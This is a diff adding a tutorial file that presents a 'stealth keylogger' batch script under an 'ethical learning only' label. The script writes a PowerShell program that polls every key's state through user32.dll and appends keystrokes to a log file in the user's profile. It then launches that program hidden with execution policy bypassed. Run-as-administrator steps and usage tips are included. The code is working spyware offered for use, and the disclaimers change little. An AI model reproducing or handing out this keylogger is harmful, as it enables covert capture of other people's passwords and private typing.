@@ -1,0 +1,68 @@
+# Stealth Keylogger (Ethical Learning Only)  
+-------------------------------------------------------------------------------------------------------------  
+This Batch File demonstrates a **basic keylogger setup** for educational and ethical hacking awareness.  
+It uses an **external tool (like `PowerShell` or third-party EXE)** to capture keystrokes silently.  
+The goal is to understand how keyloggers work — **NEVER use this to invade privacy or commit unethical acts**.  
+--------------------------------------------------------------------------------------------------------------  
+
+# STEPS  
+1. Download a lightweight open-source keylogger like **Revealer Keylogger** or **LogKext**.  
+   (For this demo, we'll use a PowerShell-based logger.)  
+2. Open Notepad  
+3. Copy and Paste the Following Code  
+4. Save the file as `keylogger.bat`  
+5. Right-click → Run as Administrator  
+--------------------------------------------------------------------------------------------------------------  
+
+# CODE  
+@echo off  
+title Stealth Keylogger (Educational Use Only)  
+cls  
+
+echo ========================================  
+echo       STEALTH KEYLOGGER (DEMO)  
+echo ========================================  
+echo This demo uses a PowerShell script to simulate keylogging.  
+echo Logs will be stored in: %USERPROFILE%\keylog.txt  
+echo ========================================  
+
+:: Run the PowerShell keylogger  
+powershell -WindowStyle Hidden -Command "  
+$code = '
+Add-Type -AssemblyName System.Windows.Forms
+[System.Windows.Forms.Application]::EnableVisualStyles()
+Add-Type -TypeDefinition @\"
+using System;
+using System.Runtime.InteropServices;
+public class KeyboardListener {
+    [DllImport(\"user32.dll\")]
+    public static extern int GetAsyncKeyState(Int32 i);
+}
+\"@
+while ($true) {
+    Start-Sleep -Milliseconds 100
+    foreach ($char in 1..255) {
+        if ([KeyboardListener]::GetAsyncKeyState($char) -eq -32767) {
+            Add-Content \"$env:USERPROFILE\\keylog.txt\" ([char]$char)
+        }
+    }
+}
+'
+Set-Content \"$env:USERPROFILE\\keylogger.ps1\" $code
+Start-Process powershell -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -File \"$env:USERPROFILE\\keylogger.ps1\"'
+"
+
+echo Keylogger started in the background.
+pause  
+exit  
+
+--------------------------------------------------------------------------------------------------------------  
+
+# Usage Tips  
+1. Run the script **as Administrator** for best results.  
+2. It creates and launches a hidden PowerShell script that logs keystrokes to `keylog.txt`.  
+3. You can check the log file at `%USERPROFILE%\keylog.txt`.  
+4. To stop logging, open Task Manager and end `powershell.exe`.  
+5. Again, **never use this script without consent — it is for learning purposes only**.  
+
+--------------------------------------------------------------------------------------------------------------
